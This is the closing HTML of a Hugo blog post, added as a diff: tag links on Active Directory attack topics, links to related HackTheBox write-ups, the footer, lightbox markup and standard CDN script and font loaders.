+            <a href="/tags/certipy/">Certipy</a>
+        
+            <a href="/tags/bloodhound/">Bloodhound</a>
+        
+            <a href="/tags/adcs/">ADCS</a>
+        
+            <a href="/tags/smb/">SMB</a>
+        
+            <a href="/tags/acl/">ACL</a>
+        
+            <a href="/tags/dacl/">DACL</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-escapetwo/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-escapetwo/EscapeTwo.c07d830cfe2ef0feb8c5afd7fb023095_hu_e35d41a0b92082a3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - EscapeTwo"
+                        
+                        data-hash="md5-wH2DDP4u8P64xa/X&#43;wIwlQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - EscapeTwo</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-manager/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-manager/Manager.b39510e01f5140b468be0c5fc8b63ed0_hu_cd56150e22277788.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Manager"
+                        
+                        data-hash="md5-s5UQ4B9RQLRovgxfyLY&#43;0A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Manager</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-devvortex/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-devvortex/Devvortex.61ba3466bff8da52f89d2bb6417fb83a_hu_201692c3d88d95d3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Devvortex"
+                        
+                        data-hash="md5-Ybo0Zr/42lL4nSu2QX&#43;4Og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Devvortex</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-surveillance/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-surveillance/Surveillance.8b9fd8fd814572f9ed8f343a005ca93c_hu_bcb613ec347092dc.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Surveillance"
+                        
+                        data-hash="md5-i5/Y/YFFcvntjzQ6AFypPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Surveillance</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-hospital/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-hospital/Hospital.dd28dc96da49df800b952a77639d4857_hu_f800468aaa2a80f2.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Hospital"
+                        
+                        data-hash="md5-3SjcltpJ34ALlSp3Y51IVw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Hospital</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2023 - 
+        
+        2025 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
